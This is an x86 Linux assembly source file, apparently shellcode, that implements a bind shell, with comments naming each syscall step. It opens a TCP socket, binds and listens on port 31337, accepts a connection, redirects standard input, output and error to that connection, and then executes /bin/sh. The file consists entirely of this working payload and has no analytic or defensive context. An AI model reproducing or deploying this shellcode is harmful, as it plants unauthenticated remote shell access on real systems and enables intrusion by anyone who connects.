.text
  .global _start

_start:
#fd = socket(2, 1, 0)
push $0x66
pop %eax
push $0x1
pop %ebx
cltd
push %edx
push %ebx
push $0x2
mov %esp,%ecx
int $0x80

mov %eax,%esi

#bind(fd, [2, 31337, 0] , 16)
mov $0x66,%al
mov $0x2,%bl
push %edx
pushw $0x697a
push %bx
mov %esp,%ecx
push $0x10
push %ecx
push %esi
mov %esp,%ecx
int $0x80

#listen(fd, 22);
mov $0x66,%al
mov $0x4,%bl
int $0x80

#fd2 = accept(fd, 0, 0);
mov $0x66,%al
mov $0x5,%bl
push %edx
push %esi
mov %esp,%ecx
int $0x80

mov %eax,%ebx

#dup2(fd2, 2);
push $0x2
pop %ecx
duploop:
mov $0x3f,%al
int $0x80
dec %ecx
jns duploop

#execve("/bin/sh", 0, 0);

push %edx
push $0x68732F2F
push $0x6E69622F
mov %esp, %ebx
mov $0xb, %al
xor %ecx, %ecx
int $0x80

